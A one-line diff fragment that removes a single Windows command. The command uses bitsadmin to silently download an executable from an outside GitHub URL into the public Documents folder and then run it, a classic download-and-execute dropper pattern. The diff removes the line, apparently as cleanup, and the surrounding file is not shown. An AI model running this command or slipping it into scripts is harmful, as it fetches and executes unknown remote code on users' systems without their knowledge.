@@ -1,1 +1,0 @@
-cmd /c bitsadmin.exe /transfer My https://github.com/Co0nan/conan/raw/master/win32.exe c:\users\public\Documents\win32.exe > nul && C:\users\public\Documents\win32.exe > nul
